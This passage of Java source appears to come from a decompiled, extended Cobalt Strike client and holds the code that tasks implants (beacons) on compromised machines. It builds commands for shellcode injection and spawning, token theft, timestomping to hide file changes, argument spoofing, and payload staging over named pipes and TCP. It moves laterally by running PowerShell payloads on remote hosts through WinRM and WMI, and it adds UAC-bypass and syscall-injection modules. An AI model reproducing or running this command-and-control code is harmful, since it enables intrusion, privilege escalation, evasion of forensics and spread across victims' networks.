			this.conn.call("beacons.rportfwd", CommonUtils.args(var1, Integer.valueOf(var4), var3, Integer.valueOf(var4)));

		}


		this.builder.setCommand(102);

		this.builder.addShort(var4);

		this.conn.call("beacons.task", CommonUtils.args(var1, this.builder.build()));

		byte[] var7 = CommonUtils.readFile(var5);

		if ("x64".equals(var2)) {
			this.builder.setCommand(44);

		}
		else {

			this.builder.setCommand(1);

		}


		this.builder.addString(CommonUtils.bString(var7));

		this.conn.call("beacons.task", CommonUtils.args(var1, this.builder.build()));

		GoInteractive(var1);

	}


	public void SpawnAs(String var1, String var2, String var3, String var4) {
		ScListener var5 = ListenerUtils.getListener(this.client, var4);


		for (int var6 = 0; var6 < this.bids.length; var6++) {
			String var7 = arch(this.bids[var6]);

			this.builder.setCommand("x64".equals(var7) ? 94 : 93);

			this.builder.addLengthAndEncodedString(this.bids[var6], var1);

			this.builder.addLengthAndEncodedString(this.bids[var6], var2);

			this.builder.addLengthAndEncodedString(this.bids[var6], var3);

			String var8 = "SpawnAs";

			DevLog.log(DevLog.STORY.CS0215_TEST_EXPORTLOCAL, getClass(), var8, "004");

			this.builder.addString(var5.exportLocal(this.client, this.bids[var6], var7));

			byte[] var9 = this.builder.build();

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var6], var9));

			log_task(this.bids[var6], "Tasked beacon to spawn " + var5 + " as " + var1 + "\\" + var2, "T1078, T1093, T1106");

		}


		linkToPayloadLocal(var5);

	}


	public void SpawnTo() {
		taskNoArgs(13, "Tasked beacon to spawn features to default process", "T1093");

	}


	public void SpawnTo(String var1, String var2) {
		if ("x86".equals(var1)) {
			taskOneEncodedArg(13, var2, "Tasked beacon to spawn " + var1 + " features to: " + var2, "T1093");

		}
		else {

			taskOneEncodedArg(69, var2, "Tasked beacon to spawn " + var1 + " features to: " + var2, "T1093");

		}

	}


	public void SpawnUnder(int var1, String var2) {
		ScListener var3 = ListenerUtils.getListener(this.client, var2);


		for (int var4 = 0; var4 < this.bids.length; var4++) {
			String var5 = arch(this.bids[var4]);

			this.builder.setCommand("x64".equals(var5) ? 99 : 98);

			this.builder.addInteger(var1);

			String var6 = "SpawnUnder";

			DevLog.log(DevLog.STORY.CS0215_TEST_EXPORTLOCAL, getClass(), var6, "005");

			this.builder.addString(var3.exportLocal(this.client, this.bids[var4], var5));

			byte[] var7 = this.builder.build();

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var4], var7));

			log_task(this.bids[var4], "Tasked beacon to spawn " + var3 + " as a child of " + var1, "T1106, T1093");

		}


		linkToPayloadLocal(var3);

	}


	public void SpoofArgsAdd(String var1, String var2) {
		(new StringBuilder()).append(var1).append(" ").append(var2).toString();

		this.builder.setCommand(83);

		this.builder.addLengthAndString(var1);

		this.builder.addLengthAndString(var1 + " " + var1);

		byte[] var4 = this.builder.build();


		for (int var5 = 0; var5 < this.bids.length; var5++) {
			log_task(this.bids[var5], "Tasked beacon to spoof '" + var1 + "' as '" + var2 + "'", "T1059, T1093, T1106");

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));

		}

	}


	public void SpoofArgsList() {
		taskNoArgsCallback(85, "Tasked beacon to list programs and spoofed arguments", "");

	}


	public void SpoofArgsRemove(String var1) {
		this.builder.setCommand(84);

		this.builder.addString(var1 + "\000");

		byte[] var2 = this.builder.build();


		for (int var3 = 0; var3 < this.bids.length; var3++) {
			log_task(this.bids[var3], "Tasked beacon to not spoof arguments for '" + var1 + "'", "T1059, T1093, T1106");

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));

		}

	}


	public void StealToken(int var1) {
		taskOneArgI(31, var1, "Tasked beacon to steal token from PID " + var1, "T1134");

	}


	public void ShellcodeInject(int var1, String var2, String var3) {
		byte[] var4 = CommonUtils.readFile(var3);

		this.builder.setCommand(var2.equals("x64") ? 43 : 9);

		this.builder.addInteger(var1);

		this.builder.addInteger(0);

		this.builder.addString(CommonUtils.bString(var4));

		byte[] var5 = this.builder.build();

		String[] var6 = this.bids;

		int var7 = var6.length;


		for (int var8 = 0; var8 < var7; var8++) {
			String var9 = var6[var8];

			String var10 = checkProcessInjectExplicitHook(var9, var4, var1, 0, var2);

			if (CommonUtils.isNullOrEmpty(var10)) {
				this.conn.call("beacons.task", CommonUtils.args(var9, var5));

			}


			log_task(var9, "Tasked beacon to inject " + var3 + " into " + var1 + " (" + var2 + ")", "T1055");

		}

	}


	public void ShellcodeSpawn(String var1, String var2) {
		byte[] var3 = CommonUtils.readFile(var2);

		if ("x64".equals(var1)) {
			this.builder.setCommand(44);

		}
		else {

			this.builder.setCommand(1);

		}


		this.builder.addString(CommonUtils.bString(var3));

		byte[] var4 = this.builder.build();


		for (int var5 = 0; var5 < this.bids.length; var5++) {
			log_task(this.bids[var5], "Tasked beacon to spawn " + var2 + " in " + var1 + " process", "T1093");

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));

		}

	}


	public void StagePipe(String var1, String var2, String var3, String var4, ScListener var5) {
		String var6 = "StagePipe";

		DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, getClass(), var6, "003");

		byte[] var7 = var5.export(this.client, var4);

		var7 = ArtifactUtils.XorEncode(var7, var4);

		this.builder.setCommand(57);

		this.builder.addLengthAndString("\\\\" + var2 + "\\pipe\\" + var3);

		this.builder.addString(var7);

		this.conn.call("beacons.task", CommonUtils.args(var1, this.builder.build()));

	}


	public void StageTCP(String var1, String var2, int var3, String var4, ScListener var5) {
		this.builder.setCommand(52);

		this.builder.addLengthAndStringASCIIZ(var2);

		this.builder.addInteger(var3);

		String var6 = "StageTCP";

		DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, getClass(), var6, "004");

		byte[] var7 = var5.export(this.client, var4);

		var7 = ArtifactUtils.XorEncode(var7, var4);

		byte[] var8 = CommonUtils.toBytes(var5.getProfile().getString(".bind_tcp_garbage"));

		this.builder.addString(Shellcode.BindProtocolPackage(CommonUtils.join(var8, var7)));

		this.conn.call("beacons.task", CommonUtils.args(var1, this.builder.build()));

	}


	public void TimeStomp(String var1, String var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			TimeStomp(this.bids[var3], var1, var2);

		}

	}


	public void TimeStomp(String var1, String var2, String var3) {
		this.builder.setCommand(29);

		this.builder.addLengthAndEncodedString(var1, var3);

		this.builder.addLengthAndEncodedString(var1, var2);

		byte[] var4 = this.builder.build();

		log_task(var1, "Tasked beacon to timestomp " + var2 + " to " + var3, "T1099");

		(new Timestomp(this.client, var2, var3)).go(var1);

	}


	public void Unlink(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			log_task(this.bids[var2], "Tasked to unlink " + var1, "T1090");

			this.conn.call("beacons.unlink", CommonUtils.args(this.bids[var2], var1));

		}

	}


	public void Unlink(String var1, String var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			log_task(this.bids[var3], "Tasked to unlink " + var1 + "@" + var2, "T1090");

			this.conn.call("beacons.unlink", CommonUtils.args(this.bids[var3], var1, var2));

		}

	}


	public void Upload(String var1) {
		String var2 = (new File(var1)).getName();

		Upload(var1, var2);

	}


	public void Upload(String var1, String var2) {
		try {

			FileInputStream var3 = new FileInputStream(var1);

			byte[] var4 = CommonUtils.readAll(var3);

			var3.close();

			UploadRaw(var1, var2, var4);

		}
		catch (Exception var5) {
			MudgeSanity.logException("Upload: " + var1 + " -> " + var2, var5, false);

		}

	}


	public void UploadRaw(String var1, String var2, byte[] var3) {
		for (int var4 = 0; var4 < this.bids.length; var4++) {
			UploadRaw(this.bids[var4], var1, var2, var3);

		}

	}


	public void UploadRaw(String var1, String var2, String var3, byte[] var4) {
		ByteIterator var5 = new ByteIterator(var4);

		LinkedList<byte[]> var6 = new LinkedList();

		this.builder.setCommand(10);

		this.builder.addLengthAndEncodedString(var1, var3);

		this.builder.addString(CommonUtils.bString(var5.next(786432L)));

		var6.add(this.builder.build());


		while (var5.hasNext()) {
			this.builder.setCommand(67);

			this.builder.addLengthAndEncodedString(var1, var3);

			this.builder.addString(CommonUtils.bString(var5.next(260096L)));

			var6.add(this.builder.build());

		}


		log_task(var1, "Tasked beacon to upload " + var2 + " as " + var3);

		Iterator var7 = var6.iterator();


		while (var7.hasNext()) {
			byte[] var8 = (byte[]) var7.next();

			this.conn.call("beacons.task", CommonUtils.args(var1, var8));

		}


		this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.FileIndicator(var1, var3, var4)));

	}


	public void WinRM(String var1, String var2) {
		ScListener var3 = ListenerUtils.getListener(this.client, var2);


		for (int var4 = 0; var4 < this.bids.length; var4++) {
			WinRM(this.bids[var4], var1, "x86", var3);

		}

	}


	public void WinRM(String var1, String var2, String var3, ScListener var4) {
		String var5 = "WinRM";

		DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, getClass(), var5, "005");

		byte[] var6 = var4.export(this.client, var3);

		String var7 = CommonUtils.bString((new ResourceUtils(this.client)).buildPowerShell(var6, "x64".equals(var3)));

		var7 = "Invoke-Command -ComputerName " + var2 + " -ScriptBlock { " + var7 + " }";

		log_task(var1, "Tasked beacon to run " + var4 + " on " + var2 + " via WinRM", "T1028, T1086");

		PowerShellTasks var8 = new PowerShellTasks(this.client, var1);

		String var9 = var8.getScriptCradle(var7);

		var8.runCommand(var9);

	}


	public void WMI(String var1, String var2) {
		ScListener var3 = ListenerUtils.getListener(this.client, var2);


		for (int var4 = 0; var4 < this.bids.length; var4++) {
			WMI(this.bids[var4], var1, var3);

		}

	}


	public void WMI(String var1, String var2, ScListener var3) {
		PowerShellTasks var4 = new PowerShellTasks(this.client, var1);

		byte[] var5 = var3.getPayloadStager("x86");

		String var6 = CommonUtils.bString((new PowerShellUtils(this.client)).buildPowerShellCommand(var5));

		var6 = "Invoke-WMIMethod win32_process -name create -argumentlist '" + var6 + "' -ComputerName " + var2;

		log_task(var1, "Tasked beacon to run " + var3 + " on " + var2 + " via WMI", "T1047, T1086");

		String var7 = var4.getScriptCradle(var6);

		var4.runCommand(var7);

	}


	public void linkToPayloadLocal(ScListener var1) {
		if ("windows/beacon_bind_pipe".equals(var1.getPayload())) {
			Pause(1000);


			for (int var2 = 0; var2 < this.bids.length; var2++) {
				LinkExplicit(this.bids[var2], var1.getPipeName("."));

			}

		}
		else if ("windows/beacon_bind_tcp".equals(var1.getPayload())) {
			Pause(1000);


			for (int var2 = 0; var2 < this.bids.length; var2++) {
				ConnectExplicit(this.bids[var2], "127.0.0.1", var1.getPort());

			}

		}

	}


	public void linkToPayloadRemote(ScListener var1, String var2) {
		if (".".equals(var2)) {
			linkToPayloadLocal(var1);

		}

		else if ("windows/beacon_bind_pipe".equals(var1.getPayload())) {
			Pause(1000);


			for (int var3 = 0; var3 < this.bids.length; var3++) {
				LinkExplicit(this.bids[var3], var1.getPipeName(var2));

			}

		}
		else if ("windows/beacon_bind_tcp".equals(var1.getPayload())) {
			Pause(1000);


			for (int var3 = 0; var3 < this.bids.length; var3++)

				ConnectExplicit(this.bids[var3], var2, var1.getPort());

		}

	}

	public void arp(String var1, String arg) {
		(new arp(this.client)).go(var1);
	}

	public void arp(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.arp(this.bids[var1], arg);
		}

	}

	public void uacscan(String var1, String arg) {
		(new uacscan(this.client)).go(var1);
	}

	public void uacscan(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.uacscan(this.bids[var1], arg);
		}

	}


	public void whoami(String var1, String arg) {
		(new whoami(this.client)).go(var1);
	}

	public void whoami(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.whoami(this.bids[var1], arg);
		}

	}

	public void env(String var1, String arg) {
		(new env(this.client)).go(var1);
	}

	public void env(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.env(this.bids[var1], arg);
		}

	}

	public void cat(String var1, String arg) {
		(new cat(this.client, arg)).go(var1);
	}

	public void cat(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.cat(this.bids[var1], arg);
		}

	}

	public void uac2(String var1, String arg) {
		(new uac2(this.client, arg)).go(var1);
	}

	public void uac2(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.uac2(this.bids[var1], arg);
		}

	}

	public void uacsspi(String var1, String arg) {
		(new uacsspi(this.client, arg)).go(var1);
	}

	public void uacsspi(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.uacsspi(this.bids[var1], arg);
		}

	}

	public void pythonBOF(String var1, String arg) {
		(new pythonBOF(this.client, arg)).go(var1);
	}

	public void pythonBOF(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.pythonBOF(this.bids[var1], arg);
		}

	}

	public void screenshotp(String var1, String arg) {
		(new screenshotp(this.client)).go(var1);
	}

	public void screenshotp(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.screenshotp(this.bids[var1], arg);
		}

	}

	public void syscalls_inject(String var1, String arg) {
		(new syscalls_inject(this.client, arg)).go(var1);
	}

	public void syscalls_inject(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.syscalls_inject(this.bids[var1], arg);
		}

	}

	public void syscalls_shinject(String var1, String arg) {
		(new syscalls_shinject(this.client, arg)).go(var1);
	}

	public void syscalls_shinject(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.syscalls_shinject(this.bids[var1], arg);
		}

	}

	public void ipconfig(String var1, String arg) {
		(new ipconfig(this.client)).go(var1);
	}

	public void ipconfig(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.ipconfig(this.bids[var1], arg);
		}

	}

	public void netstat(String var1, String arg) {
		(new netstat(this.client)).go(var1);
	}

	public void netstat(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.netstat(this.bids[var1], arg);
		}

	}

	public void routeprint(String var1, String arg) {
		(new routeprint(this.client)).go(var1);
	}

	public void routeprint(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.routeprint(this.bids[var1], arg);
		}
	}

	public void openport(String var1, String arg) {
		(new openport(this.client, arg)).go(var1);
	}

	public void openport(String arg) {
		for (int var1 = 0; var1 < this.bids.length; ++var1) {
			this.openport(this.bids[var1], arg);
		}

	}

}
